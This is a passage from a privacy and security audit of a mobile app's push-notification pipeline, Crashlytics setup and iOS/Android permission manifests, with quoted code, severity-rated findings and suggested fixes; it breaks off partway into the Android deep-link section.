# 10 — Push Notifications, Firebase Crashlytics Privacy, Image Upload Pipeline

Audit pass covering surfaces v1 didn't touch:

- FCM/APNs token lifecycle, push delivery, notification preferences
- Firebase Crashlytics initialization, what gets attached to reports, opt-out
- Image / document upload pipeline (mobile picker → API multer → MinIO)
- iOS Info.plist + entitlements + PrivacyInfo.xcprivacy
- Android AndroidManifest + backup rules + push setup

Code excerpts are anchored with absolute paths + line numbers.

---

## A. Push notification token lifecycle

### A1. When is the token first registered?

**File**: `/Users/pacomedomagni/Projects/havenkeep/apps/mobile/lib/main.dart:425-433`

```dart
// Only initialize push notifications if Firebase was configured
if (Firebase.apps.isNotEmpty) {
  try {
    await ref.read(pushNotificationServiceProvider).initialize();
  } catch (e) {
    LoggingService.warn('Push notification initialization failed', {'error': e.toString()});
  }
}
```

`initialize()` only wires the listeners — it does NOT request permission or fetch the token at startup. Permission is deferred until the user adds their first item (Ch05-F077, see [push_notification_service.dart:62-117](/Users/pacomedomagni/Projects/havenkeep/apps/mobile/lib/core/services/push_notification_service.dart#L62-L117)). The actual token fetch happens in `requestPermissionAndRegisterToken()` triggered after a successful "Add item".

**FINDING A1-OK**: Permission deferral pattern is privacy-friendly — no early prompt without context.

### A2. The registration endpoint

**File**: `/Users/pacomedomagni/Projects/havenkeep/apps/api/src/routes/users.ts:152-185`

```ts
router.post('/push-token', writeRateLimiter, validate(pushTokenSchema), asyncHandler(async (req, res) => {
  const { fcmToken, platform } = req.body;
  const userId = req.user!.id;
  const platformValue = platform || 'unknown';

  const client = await getClient();
  try {
    await client.query('BEGIN');
    await client.query(
      `DELETE FROM user_push_tokens WHERE fcm_token = $1 AND user_id <> $2`,
      [fcmToken, userId],
    );
    await client.query(
      `INSERT INTO user_push_tokens (user_id, fcm_token, platform, updated_at, last_seen_at)
       VALUES ($1, $2, $3, NOW(), NOW())
       ON CONFLICT (user_id, fcm_token)
       DO UPDATE SET platform = $3, updated_at = NOW(), last_seen_at = NOW()`,
      [userId, fcmToken, platformValue],
    );
    await client.query('COMMIT');
  } ...
}));
```

Auth-gated, rate-limited (`writeRateLimiter` = 30 req / 15 min — see rateLimiter.ts:317-322). Multi-tenant safe: a token previously owned by another user is evicted before the upsert (S1-I noted in code).

**FINDING A2-OK**: Eviction-on-reuse is correct — solves the "phone resold to different user" problem.

### A3. DB schema for push tokens

**Migration 007** ([file](/Users/pacomedomagni/Projects/havenkeep/apps/api/src/db/migrations/007_user_and_item_fields.sql)):

```sql
CREATE TABLE IF NOT EXISTS user_push_tokens (
  id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
  user_id UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
  fcm_token VARCHAR(512) NOT NULL,
  platform VARCHAR(20) NOT NULL DEFAULT 'unknown',
  created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  UNIQUE (user_id, fcm_token)
);
```

**Migration 064** adds `last_seen_at TIMESTAMPTZ NOT NULL DEFAULT NOW()` + index `idx_user_push_tokens_last_seen`.

**FINDING A3-W1 (LOW)**: `UNIQUE (user_id, fcm_token)` — *not* `UNIQUE (fcm_token)`. The `DELETE FROM user_push_tokens WHERE fcm_token = $1 AND user_id <> $2` step compensates for this (so the same token is owned by exactly one user at a time), but the constraint itself permits temporary duplication during the window between the DELETE and the upsert if the route handler crashes mid-transaction. Mitigated by the surrounding BEGIN/COMMIT.

**FINDING A3-W2 (MED)**: `platform` is a free-text VARCHAR(20) with no CHECK — any client can submit `platform: 'mainframe'`. The Joi schema `pushTokenSchema` should enforce `.valid('ios', 'android', 'web')` — search confirms it isn't enforced server-side past Joi. Worth checking [validators/index.ts pushTokenSchema](/Users/pacomedomagni/Projects/havenkeep/apps/api/src/validators) — partial visibility from grep suggests no explicit enum.

### A4. Token rotation

**File**: `/Users/pacomedomagni/Projects/havenkeep/apps/mobile/lib/core/services/push_notification_service.dart:69-81`

```dart
_subscriptions.add(
  messaging.onTokenRefresh.listen(
    (newToken) {
      if (kDebugMode) {
        debugPrint('[Push] Token refreshed.');
      }
      _registerTokenWithBackend(newToken);
    },
    onError: (Object error) {
      debugPrint('[Push] onTokenRefresh stream error: $error');
    },
  ),
);
```

**FINDING A4-W1 (MED)**: When FCM rotates a token, only the new token is registered — the **old token is never explicitly de-registered**. The cleanup relies on:
1. FCM eventually rejecting the old token with `messaging/registration-token-not-registered` → fcm.service.ts deletes it (DEAD_TOKEN_CODES).
2. The 60-day stale-cleanup cron (fcm.service.ts:177-189).

In the meantime (potentially days), the user has both old + new tokens registered. If they sign out and another user signs in *and* gets handed back the old (still-rotating) token by FCM, eviction kicks in. But the actual hole: stale tokens accumulate per device until FCM bounces them. Acceptable given the delete-on-error path, but the comment in push_notification_service.dart understates it.

### A5. De-registration on sign-out

**File**: `/Users/pacomedomagni/Projects/havenkeep/apps/api/src/routes/auth.ts:778-849` (logout handler).

The logout flow:
- Blacklists the access token
- Deletes the matching `refresh_tokens` row
- Invalidates `password_reset_tokens` + `email_verification_tokens`

**FINDING A5-CRIT**: The `/auth/logout` handler **does NOT delete the user's push tokens**. After sign-out, the device's FCM token remains in `user_push_tokens` and the user keeps receiving push notifications until either (a) a new user signs in on that device and triggers eviction, or (b) the 60-day stale-cleanup picks it up, or (c) FCM rotates the token and the new one fails to register with the now-unauthenticated client.

Real-world impact: a user on a shared phone signs out; the next user gets the previous owner's warranty-expiring pushes (with item names) until a new push token is registered. That's a privacy bug, not just a nuisance.

Fix: add `DELETE FROM user_push_tokens WHERE user_id = $1 AND fcm_token = $2` to logout, with the mobile passing the current FCM token in the logout body.

The same hole exists in `/auth/logout-all` ([auth.ts:881-906](/Users/pacomedomagni/Projects/havenkeep/apps/api/src/routes/auth.ts#L881-L906)) — push tokens for all the user's devices stay registered.

### A6. De-registration on account-delete

**File**: `/Users/pacomedomagni/Projects/havenkeep/apps/api/src/services/account-purge.service.ts:113`

```ts
const del = await txClient.query(`DELETE FROM users WHERE id = $1`, [userId]);
```

`user_push_tokens.user_id` has FK ON DELETE CASCADE (mig 007). So at the **30-day permanent-purge** stage, push tokens are wiped via cascade.

**FINDING A6-CRIT**: At the **soft-delete** stage (users.ts:636-648), the user's push tokens are NOT deleted. The user is marked `deleted_at = NOW(), plan = 'suspended'` but `user_push_tokens` rows persist. A scheduled cron firing during the 30-day cooling-off would still target this user via FcmService.sendToUser (which only checks `user_push_tokens` by `user_id`, not by user soft-delete state). Privacy claim violated: the "delete account" UX has just told the user their account is deleted, but pushes can still arrive.

Fix: either (a) add `DELETE FROM user_push_tokens WHERE user_id = $1` in the soft-delete txn, or (b) add an `AND u.deleted_at IS NULL` join in `FcmService.sendToUser` and the cron query paths.

### A7. Token storage

`fcm_token VARCHAR(512) NOT NULL` — **plaintext**. No hash, no encryption.

**FINDING A7-LOW**: FCM tokens are sometimes characterized as low-sensitivity (they're just routing identifiers, the real auth is the FCM service account credentials), but a leaked token gives an attacker who *also* compromises the Firebase project the ability to push arbitrary content to that device. AWS SNS tokens are stored similarly. Acceptable given the privacy boundary, but worth a note in the threat model.

### A8. Token uniqueness constraint

`UNIQUE (user_id, fcm_token)` — covered in A3-W1.

---

## B. APNs setup (iOS)

### B1. The APNs key/p8

The API uses the **Firebase Admin SDK** to send pushes — Firebase wraps APNs and FCM under one credential.

**File**: `/Users/pacomedomagni/Projects/havenkeep/apps/api/src/services/fcm.service.ts:13-29`

```ts
const json = config.firebase.serviceAccountJson;
if (!json) {
  logger.warn('FIREBASE_SERVICE_ACCOUNT_JSON is not set — FCM push delivery disabled');
  return null;
}
const serviceAccount = JSON.parse(json);
_app = admin.initializeApp({
  credential: admin.credential.cert(serviceAccount),
});
```

So there's no separate p8 file — the APNs key is uploaded once into Firebase Console and Firebase brokers the rest. The full JSON is read from `FIREBASE_SERVICE_ACCOUNT_JSON` env var.

**FINDING B1-OK**: Single-secret model is simpler. Per CLAUDE.md, secrets live in `/opt/staging/havenkeep/.env.api` on the droplet.

**FINDING B1-W1 (LOW)**: `JSON.parse(json)` has no validation of the parsed shape. Malformed JSON produces a logged-but-swallowed init failure (catch at line 26-29), which is sane, but a partially-correct shape (e.g. wrong project_id) wouldn't be caught here — would surface as runtime auth errors at first send.

### B2. The team ID + key ID

Not present in the API codebase — managed inside Firebase Console as part of the APNs auth key upload. The team ID is referenced in CLAUDE.md (`N3RF2GHS99`).

### B3. Bundle ID match

**File**: `/Users/pacomedomagni/Projects/havenkeep/apps/mobile/ios/Runner/Info.plist:13` → `$(PRODUCT_BUNDLE_IDENTIFIER)` resolved at build time. Per CLAUDE.md and pbxproj, `app.havenkeep.mobile`. Matches the Firebase iOS App. ✓

### B4. Production vs sandbox

**File**: `/Users/pacomedomagni/Projects/havenkeep/apps/mobile/ios/Runner/Runner.entitlements:21-22`

```xml
<key>aps-environment</key>
<string>development</string>
```

The comment says: "Xcode auto-flips this to 'production' when the build is exported for App Store / TestFlight."

**FINDING B4-W1 (MED)**: Xcode does NOT automatically flip `aps-environment` based on archive vs run — it's tied to the *provisioning profile* selected (Development vs Distribution). With auto-signing under Xcode, distribution builds usually pick up Distribution profiles, but the entitlements file value is what's *embedded*. If a developer runs `flutter build ipa --export-options-plist` with a Development profile, the `development` value persists into the IPA — the resulting build's pushes will be routed to the APNs sandbox endpoint and **production sends from the Firebase backend will silently fail** (the device never registers a production token).

Fix: leave the file as `development` (since the iOS toolchain *does* let the active provisioning profile override at archive time when entitlements are properly merged), but add a build-script step that asserts `aps-environment` is `production` before TestFlight upload. Alternatively, use `Capabilities` → `Push Notifications` to let Xcode manage this directly. The current comment is optimistic.

### B5. The APNs HTTP/2 client lifecycle

Managed by `firebase-admin` SDK — opaque from this codebase. Single `admin.initializeApp` call (fcm.service.ts:21-23), `admin.messaging()` is called per-send. The SDK pools HTTP/2 connections internally.

**FINDING B5-OK**: No leaks at this layer; SDK handles it.

### B6. The push payload size limit

FCM caps at 4096 bytes total payload (data + notification). The send code (fcm.service.ts:97-112) builds a notification with title, body, and a small `data` map. No length validation — if a caller passes a 5000-character notification body, FCM will reject the whole batch with `messaging/invalid-argument`, which the code treats as `DEAD_TOKEN_CODES` and **deletes the token**.

**FINDING B6-CRIT**: A bug elsewhere (e.g. a notification template that interpolates an unbounded user input field) would cause every push to a given user to fail with `invalid-argument`, and **the FCM service would delete every one of that user's tokens** as a result, treating "your input is too big" as "your token is dead." Then the user stops receiving notifications entirely until they reinstall.

Look at fcm.service.ts:49-54:
```ts
const DEAD_TOKEN_CODES: ReadonlySet<string> = new Set<string>([
  'messaging/invalid-registration-token',
  'messaging/registration-token-not-registered',
  'messaging/sender-id-mismatch',
  'messaging/invalid-argument',  // ← fires on payload-too-large too
]);
```

The Firebase docs confirm `invalid-argument` is overloaded: bad token shape OR bad payload OR bad data type. Conflating them is unsafe.

Fix: drop `messaging/invalid-argument` from `DEAD_TOKEN_CODES`. Keep it as a logged warning. Or pre-validate payload size (≤4 KB) before the send loop.

---

## C. FCM setup (Android)

### C1. The FCM service account key

Same as B1 — single Firebase Admin service-account JSON in `FIREBASE_SERVICE_ACCOUNT_JSON`. Mobile-side, the project is configured via `apps/mobile/lib/core/config/firebase_options.dart` reading dotenv values.

### C2. The Firebase project ID

Not hardcoded — read from `FIREBASE_PROJECT_ID` env (firebase_options.dart:30, 37). CLAUDE.md says staging needs real values dropped into `apps/mobile/.env.staging`.

### C3. The package name match

`/Users/pacomedomagni/Projects/havenkeep/apps/mobile/android/app/build.gradle.kts:19` → `namespace = "app.havenkeep.mobile"` and `applicationId = "app.havenkeep.mobile"` (line 36). Matches Firebase Android App. ✓

### C4. The retry config

**File**: `/Users/pacomedomagni/Projects/havenkeep/apps/api/src/services/fcm.service.ts:120-145`

No explicit retry — `messaging.sendEach(...)` is called once per batch. Transient errors (`quota-exceeded`, `server-unavailable`, `internal-error`) are logged and the token retained:

```ts
} else if (code && TRANSIENT_CODES.has(code)) {
  logger.warn(
    { code, userId, token: token.substring(0, 20) + '...' },
    'FCM transient error — token retained',
  );
}
```

But the notification_history row is flipped to `delivery_status = 'failed'` (notifications.service.ts:984-988) on transient error — **the push is never retried**.

**FINDING C4-MED**: Transient errors should retry (with exponential backoff) at least once before marking the row failed. As written, a momentary FCM outage during the daily warranty-reminder cron silently drops every push for the duration. The 24-hour dedup window then prevents tomorrow's run from picking up the same items.

Fix: wrap the send in a 1-2-attempt retry with 100-500ms jitter on `TRANSIENT_CODES`, OR mark the row as `'pending'` (not `'failed'`) on transient so the cron re-tries the next day.

---

## D. Notification sending

### D1. The send function

**File**: `/Users/pacomedomagni/Projects/havenkeep/apps/api/src/services/fcm.service.ts:80-171` (`FcmService.sendToUser`).

Pulls all tokens for a user, batches by 500 (the per-call cap), `sendEach`'s the messages. Deletes dead tokens, bumps `last_seen_at` on delivered, returns success count.

### D2. Error handling — failed delivery → mark token invalid?

Yes — codes in `DEAD_TOKEN_CODES` cause `DELETE FROM user_push_tokens` (fcm.service.ts:148-157). See B6 for the over-aggressive `invalid-argument` issue.

### D3. Batch send / throttling

- Per-user: tokens batched into 500-token slices (fcm.service.ts:120-145).
- Across users: **no throttling**. The cron loops across rows synchronously; each call to `sendToUser` is awaited.

**FINDING D3-LOW**: For 10k expiring warranties triggered in a single cron invocation, this is a serial sequence of FCM HTTP calls. With FCM's batch API capable of 500 tokens/call, there's no API-level rate issue, but the cron's wall-clock time grows linearly. Acceptable at current scale (CLAUDE.md says production months away).

### D4. Notification template rendering

**File**: `/Users/pacomedomagni/Projects/havenkeep/apps/api/src/services/notifications.service.ts:729-816` (`createFromTemplate`).

Templates pulled from `notification_templates` table; variables interpolated through a **whitelist** (notifications.service.ts:758-767):

```ts
const ALLOWED_TEMPLATE_VARS = new Set([
  'userName', 'userEmail', 'fullName',
  'itemName', 'itemBrand', 'itemCategory', 'itemModel',
  'daysRemaining', 'expiryDate', 'warrantyEndDate',
  ...
]);

for (const [key, value] of Object.entries(vars)) {
  if (!ALLOWED_TEMPLATE_VARS.has(key)) {
    logger.warn({ key, templateName }, 'Skipping non-whitelisted template variable');
    continue;
  }
  const safeValue = String(value).replace(/\{\{/g, '{ {').replace(/\}\}/g, '} }');
  ...
}
```

**FINDING D4-OK**: Whitelist + escape of `{{` `}}` prevents nested template injection. Solid.

**FINDING D4-W1 (LOW)**: `userEmail` is an allowed variable. If a notification template body contains `{{userEmail}}`, the user's email gets baked into the FCM payload. FCM stores notification payloads on Google's servers in transit; this widens the data-residency surface. Probably fine, but worth flagging — a notification body shouldn't need to include the recipient's own email.

### D5. The data payload — PII review

Active sends in notifications.service.ts:

- `warranty_expiring`: `data: { type: 'warranty_expiring', item_id: row.item_id }` — UUID only. ✓
- `maintenance_due`: `data: { type: 'maintenance_due', item_id, schedule_id }` — UUIDs. ✓
- `claim_opportunity`: `data: { type, item_id }` ✓
- `digest`: `data: { type: 'digest', count, history_id }` ✓

The notification *body* is built server-side and includes itemLabel like `"Your warranty for Sony Bravia expires on 2026-06-15."` — the brand + name are visible in the lock-screen notification (privacy-by-design tradeoff: that's the value prop).

**FINDING D5-OK**: `data` payload is UUID-only. The user-visible body deliberately includes item info (which is the whole point), and lock-screen notifications can be hidden by the OS when the device is locked if the user prefers (iOS / Android settings, both global and per-app).

### D6. collapse_id / collapse_key

**Not set** anywhere. Each send is treated as a unique notification.

**FINDING D6-W1 (LOW)**: Without `collapse_key`, two `warranty_expiring` notifications for the same user sent within minutes both render as separate banners. The notification body has the item name, so the second one is *informationally* different; not a real bug, but the digest path (notifications.service.ts:539-708) covers most coalescing. OK.

### D7. mutable-content / silent push

**File**: fcm.service.ts:101-103

```ts
apns: {
  payload: { aps: { sound: 'default', badge: 1 } },
},
```

No `content-available: 1` (silent push), no `mutable-content: 1`. This is a regular alert push — the OS shows the banner. ✓ for privacy.

---

## E. Notification preferences enforcement

### E1. The preferences check

**File**: `/Users/pacomedomagni/Projects/havenkeep/apps/api/src/services/notifications.service.ts:419-441`

```ts
const prefsResult = await pool.query(
  `SELECT reminders_enabled, warranty_offers_enabled, tips_enabled, digest_minutes
     FROM notification_preferences WHERE user_id = $1`,
  [data.user_id],
);
const prefs = prefsResult.rows[0] || null;

const allowed = (() => {
  if (!prefs) return true;
  switch (data.type) {
    case 'tip':                return prefs.tips_enabled !== false;
    case 'claim_opportunity':
    case 'promotional':        return prefs.warranty_offers_enabled !== false;
    case 'maintenance_due':
    case 'warranty_expiring':
    case 'warranty_expired':   return prefs.reminders_enabled !== false;
    default:                   return true;
  }
})();

const status = allowed ? 'pending' : 'skipped';
```

**FINDING E1-W1 (MED)**: The check covers `tips`, `claim_opportunity`/`promotional`, and `warranty_expiring`/`maintenance_due`/`warranty_expired`. **`item_added`, `warranty_extended`, `claim_update`, `health_score_update`, `gift_received`, `gift_activated`, `partner_commission`, `system`** all fall into `default: return true` and are ALWAYS sent.

For `system` and transactional types (`gift_activated`, `claim_update`) that's correct. But `item_added` and `health_score_update` feel like they should respect `reminders_enabled` or a generic `transactional_enabled` toggle. As-written, a user who unchecks every category in Settings still receives `item_added` after they themselves add an item — probably fine — but also `partner_commission` notifications they didn't ask for.

Fix: either tighten the allowlist (require explicit category for every type) or add a single global "system notifications" pref.

### E2. Quiet-hours check

**File**: notifications.service.ts:24-58 (`isInQuietHours`) + 715-724 (`isUserInQuietHours`).

Server-side, timezone-aware via `Intl.DateTimeFormat`, wraps midnight correctly. Used in:
- `checkAndNotifyExpirations` (notifications.service.ts:960)
- `checkAndNotifyMaintenanceDue` (line 1103)
- `checkAndNotifyWarrantyOffers` (line 1234)
- `flushDigestOutbox` (line 664)

**FINDING E2-OK**: Server-side enforcement is correct.

**FINDING E2-W1 (LOW)**: When quiet-hours kicks in for a digest flush, the row is left at `'pending'` (line 666-668) and re-tried on the next cron. But the **immediate-push paths** (warranty_expiring etc.) don't retry — they just skip silently. So a notification that lands in quiet hours for those types is effectively dropped (the 24-hour dedup window prevents the next-day re-emit from picking up the same item if the previous row is still 'pending'). Mismatch in policy.

### E3. push_enabled toggle

Checked in every send path:
```ts
if (row.push_enabled !== false && !(await NotificationsService.isUserInQuietHours(row.user_id))) {
  ...
}
```
✓

### E4. email_enabled separate from push?

Yes — separate column in `notification_preferences` with default FALSE (mig 008). Email path is gated on `if (row.email_enabled)` separately from push. ✓

### E5. The reminder cascade

The cron path emits notifications correctly (verified D5/D7 + E1-E2). One concern at E1-W1.

---

## F. Crashlytics privacy

### F1. Crashlytics initialization

**File**: `/Users/pacomedomagni/Projects/havenkeep/apps/mobile/lib/main.dart:152-170`

```dart
final firebaseOptions = DefaultFirebaseOptions.currentPlatform;
if (firebaseOptions.apiKey.isEmpty) {
  LoggingService.warn('Firebase skipped — no API key configured in .env', {});
} else {
  try {
    await Firebase.initializeApp(options: firebaseOptions);
    debugPrint('[Main] Firebase initialized successfully');
    await FirebaseCrashlytics.instance
        .setCrashlyticsCollectionEnabled(!kDebugMode);
    _crashlyticsReady = true;
  } catch (e) {
    LoggingService.warn('Firebase initialization failed', {'error': e.toString()});
  }
}
```

### F2. The collection_enabled flag

`setCrashlyticsCollectionEnabled(!kDebugMode)`. Debug builds disable; release builds enable.

**FINDING F2-OK** for debug/release split.

**FINDING F2-CRIT**: This **silently opts the user in** at first launch with no consent. The privacy policy claim "you can opt out in Settings → Privacy → Telemetry" (referenced in the audit prompt) is **not implementable in the current app** because:
1. There is no Settings → Privacy → Telemetry screen (grep confirms no `telemetry` UI string and no opt-out toggle in the user-facing settings — see P1 below).
2. `setCrashlyticsCollectionEnabled` is called once at startup and never re-evaluated in response to a user toggle.
3. There's no persisted "user has consented to crash reporting" pref.

Apple App Store guidelines (2.5.13) and Play Console privacy require explicit opt-in for non-essential analytics in some jurisdictions (GDPR-EU absolutely; CCPA US implicit opt-in is acceptable but the user must be able to opt out, *and the opt-out must work*). As-written, the privacy policy makes a promise the app can't keep.

Fix: gate `setCrashlyticsCollectionEnabled` behind a stored pref (default true outside EU, default false in EU based on locale or initial onboarding consent dialog), expose a Settings → Privacy toggle that updates the pref AND calls `setCrashlyticsCollectionEnabled(value)` immediately.

### F3. What user data is attached to crash reports?

Search for `setUserId` / `setCustomKey`:

**File**: `/Users/pacomedomagni/Projects/havenkeep/apps/mobile/lib/main.dart`

```
Line 4: import 'package:firebase_crashlytics/firebase_crashlytics.dart';
Line 103: if (_crashlyticsReady) { FirebaseCrashlytics.instance.log(...) }
Line 165: setCrashlyticsCollectionEnabled
Line 184-186: recordFlutterFatalError
Line 195-196: recordError(error, stack, fatal: true)
Line 220-222: recordError(error, stack, fatal: false)
```

NO `setUserIdentifier` / `setCustomKey` calls anywhere in the codebase. ✓ for "crashes are not directly tied to user_id."

**FINDING F3-OK**: Default Crashlytics install-id is the only identifier — matches the PrivacyInfo.xcprivacy `NSPrivacyCollectedDataTypeLinked: false` for crash data (line 137-141 of PrivacyInfo).

### F4. The zone error catch

**File**: main.dart:213-223

```dart
(error, stack) {
  LoggingService.error('Unhandled zone error', error, stack);
  if (_crashlyticsReady) {
    FirebaseCrashlytics.instance.recordError(error, stack, fatal: false);
  }
},
```

The `error` and `stack` are recorded verbatim. **Crashlytics will receive whatever `error.toString()` resolves to.**

**FINDING F4-CRIT**: If an exception's message contains user data, that text is uploaded to Crashlytics. Examples:
- An `ApiException(401, 'invalid token: eyJhbGc...')` from a server response — the JWT prefix would land in Crashlytics.
- A Drift query failure with a `WHERE user_email = 'alice@example.com'` quoted in the error message.
- An offline-sync conflict that includes the conflicting item's name.

Search confirms no global error scrubber: there's no `redactSensitive` wrapper around the `recordError` calls. Only the `LoggingService` ([logging_service.dart](/Users/pacomedomagni/Projects/havenkeep/apps/mobile/lib/core/services/logging_service.dart)) appears to redact (and the API client's `redactSensitive` is referenced at packages/api_client/lib/src/client.dart:43-44).

The privacy policy claim "Crashlytics does NOT collect the contents of your warranties, receipts, or photos" is technically correct for the *bytes* (no file contents are uploaded), but if a Dart exception is thrown with `'Failed to upload receipt for item Sony Bravia: 413 Payload Too Large'`, the **item name leaks into Crashlytics**.

Fix: wrap every `FirebaseCrashlytics.instance.recordError` call in a redactor that strips emails, JWTs, item names (as keyed by Item DB), and refers to errors by class+code only when possible. Or use `recordError(redact(error), stack, ...)`.

### F5. The unknown-enum breadcrumb

**File**: main.dart:97-107

```dart
registerUnknownEnumReporter((enumName, value, fallback) {
  LoggingService.warn('enum_drift', {
    'enum': enumName,
    'value': value,
    'fallback': fallback,
  });
  if (_crashlyticsReady) {
    FirebaseCrashlytics.instance
        .log('enum_drift: $enumName=$value (fallback=$fallback)');
  }
});
```

**FINDING F5-OK**: This breadcrumbs server enum names — like `enum_drift: WarrantyStatus=cancelled (fallback=unknown)` — and the *value* is whatever the server sent. Server enum values are non-PII (they're constants like `cancelled`, `expired`, `active`). Acceptable. The `enum` and `value` arguments are typed as String in the registerUnknownEnumReporter signature — confirmed: this won't accidentally pull in a user's item name.

### F6. reportFatal vs recordError

main.dart:184-186 calls `recordFlutterFatalError(details)` — non-fatal recording for Flutter framework errors.
main.dart:195-196 records platform errors as `fatal: true`.
main.dart:220-222 records the outer zone catch as `fatal: false`.

**FINDING F6-W1 (LOW)**: Inversion: `recordFlutterFatalError` (line 185) is documented to mark the report as fatal/crash even though the framework might recover, while platform errors (line 196) are also marked fatal: true. The outer zone catch is non-fatal: 220-222. Net effect: anything that causes a red screen → fatal; anything caught by `runZonedGuarded` → non-fatal. This is the correct shape, but the comment on 217-219 says "the framework hook already handled the genuine crash" — the Flutter framework hook calls `recordFlutterFatalError`, not `recordError(..., fatal: true)`, and the difference matters: `recordFlutterFatalError` is the Flutter-specific helper that attaches the right context. ✓

### F7. The opt-out path

See F2-CRIT — there is no opt-out path implemented.

### F8. Privacy claim verification

The privacy policy says "Crashlytics does NOT collect the contents of your warranties, receipts, or photos."

- File contents: ✓ never sent (Crashlytics doesn't accept arbitrary attachments by design).
- Warranty fields: ⚠ at risk via F4-CRIT (if an error message contains them).
- Receipt OCR results: ⚠ same risk.
- Photo bytes: ✓ never reach Crashlytics.

**FINDING F8 = same as F4-CRIT**: the claim is fragile until error-redaction is in place.

### F9. PII redaction

Per F4-CRIT — no PII redaction wrapping `recordError`. There IS a `redactSensitive` in api_client (referenced in client.dart:43-44 docstring) but it's applied to the `message` field of `ApiException` — once the exception bubbles up and `error.toString()` runs, the redacted message is what's printed. So API-level errors are partially scrubbed. Non-API errors (Drift, Hive, dotenv, plugin failures) are not.

### F10. dSYM upload pipeline

No CI hook visible in the repo for `firebase_crashlytics_send` / `Pod[Crashlytics]/run` script in pbxproj.

**FINDING F10-MED**: Without dSYM upload, iOS release crashes will arrive at Crashlytics **un-symbolicated** — addresses only, no source-line mapping. This isn't a privacy bug; it's an operability bug. Add the `${PODS_ROOT}/FirebaseCrashlytics/upload-symbols` script as a Run Script Phase in Xcode.

---

## G. iOS Info.plist permissions

**File**: `/Users/pacomedomagni/Projects/havenkeep/apps/mobile/ios/Runner/Info.plist`

### G1. NSCameraUsageDescription

Line 36-37: "HavenKeep needs camera access to scan receipts, warranties, and barcodes." ✓ — clear, mentions the three uses.

### G2. NSPhotoLibraryUsageDescription

Line 42-43: "HavenKeep needs photo library access to attach images of your items and warranty documents." ✓

### G3. NSPhotoLibraryAddUsageDescription

Line 40-41: "HavenKeep needs permission to save exported documents to your photo library." ✓

### G4. NSContactsUsageDescription

Not present. ✓ — the app doesn't request contacts.

### G5. NSUserNotificationsUsageDescription (legacy)

Not set. iOS push permission strings live in the system request; no string needed for `UserNotifications`.

### G6. NSAppTransportSecurity

Not present. iOS defaults to ATS-on (TLS 1.2+, no exceptions).

**FINDING G6-OK**: No exceptions = no plaintext HTTP. ✓

### G7. ITSAppUsesNonExemptEncryption

Line 32-33 = `false`. ✓ — matches CLAUDE.md and triggers the auto-clear export-compliance flow.

### G8. UIBackgroundModes

**Not set anywhere in Info.plist.**

**FINDING G8-MED**: Without `<key>UIBackgroundModes</key><array><string>remote-notification</string></array>`, **silent pushes** (`content-available: 1`) cannot wake the app in the background. The current FCM payload (fcm.service.ts:101-103) doesn't set `content-available`, so this is moot today. But:
- If you later want to refresh data on push (e.g. claim status update), you'll need this entitlement.
- More importantly: the `aps-environment` declaration in entitlements is sufficient for *foreground* / *banner* pushes, but Apple expects `UIBackgroundModes` declared if you do anything beyond a banner.

Decide intentionally; current shape is fine for banner-only pushes.

### G9. Associated Domains entitlements

**File**: `/Users/pacomedomagni/Projects/havenkeep/apps/mobile/ios/Runner/Runner.entitlements:13-16`

```xml
<key>com.apple.developer.associated-domains</key>
<array>
    <string>applinks:havenkeep.com</string>
</array>
```

**FINDING G9-MED**: This declares Universal Links for the **production** domain only. Per CLAUDE.md, staging lives at `staging.havenkeep.app`. A staging build will not match Universal Links from `staging.havenkeep.app/gift/<code>` — taps on the staging marketing site fall through to Safari instead of opening the app.

Fix: add `applinks:staging.havenkeep.app` for staging builds (via flavor-specific xcconfig or build setting), or add it permanently — Apple supports multi-domain entitlements.

### G10. PrivacyInfo.xcprivacy

`/Users/pacomedomagni/Projects/havenkeep/apps/mobile/ios/Runner/PrivacyInfo.xcprivacy`

Required-reasons declared: UserDefaults (CA92.1), FileTimestamp (C617.1), DiskSpace (E174.1).

Collected data declared: EmailAddress, Name, PhotosOrVideos, OtherUserContent, PurchaseHistory, CrashData. CrashData is `Linked: false`. ✓

**FINDING G10-W1 (LOW)**: Push notifications are not declared as collected data. They probably qualify as `NSPrivacyCollectedDataTypeDeviceID` (the FCM token is a device-bound identifier), with `Linked: true` (associated with the user's account). Apple's questionnaire treats push tokens loosely; many apps don't declare them. But since `user_push_tokens.user_id` IS the link, the strict answer is "yes, declare it."

**FINDING G10-W2 (LOW)**: `NSSystemBootTime` API access is reasonably common via plugin code (especially `device_info_plus`). Not declared. If the app references uptime anywhere, this becomes required for May-2024+ submissions. Quick grep on `Foundation.bootTime`/`uptime` would confirm; not done here.

---

## H. Android permissions

**File**: `/Users/pacomedomagni/Projects/havenkeep/apps/mobile/android/app/src/main/AndroidManifest.xml`

### H1. Manifest permissions

```xml
<uses-permission android:name="android.permission.INTERNET"/>
<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
<uses-permission android:name="android.permission.CAMERA"/>
<uses-permission android:name="android.permission.READ_MEDIA_IMAGES"/>
<uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
<uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM"/>
<uses-permission android:name="android.permission.USE_EXACT_ALARM"/>
<uses-permission android:name="android.permission.USE_BIOMETRIC"/>
<uses-permission android:name="android.permission.USE_FINGERPRINT"/>
<uses-permission android:name="android.permission.VIBRATE"/>
```

### H2. POST_NOTIFICATIONS — Android 13+

Declared. ✓

### H3. CAMERA

Declared. ✓

### H4. READ_MEDIA_IMAGES vs READ_EXTERNAL_STORAGE

`READ_MEDIA_IMAGES` only (Android 13+ scoped storage). NO `READ_EXTERNAL_STORAGE`.

**FINDING H4-MED**: For `minSdkVersion < 33` (Android 12 and earlier), `READ_MEDIA_IMAGES` does not exist and `image_picker` falls back to `READ_EXTERNAL_STORAGE` (the plugin handles it gracefully because `image_picker` has its own legacy permission code). However, by NOT declaring `READ_EXTERNAL_STORAGE` for older API levels, **Android 12 and earlier users may see a permission prompt that the OS treats as denied-by-default**. Verify by running on an Android 11 emulator — image_picker may auto-add it via library manifest merge, or it may not.

Fix: add `<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" android:maxSdkVersion="32"/>` to be safe. Manifest merge will dedupe.

### H5. INTERNET, ACCESS_NETWORK_STATE

Both declared. ✓

### H6. Intent-filters for deep links

**File**: AndroidManifest.xml:62-84

```xml
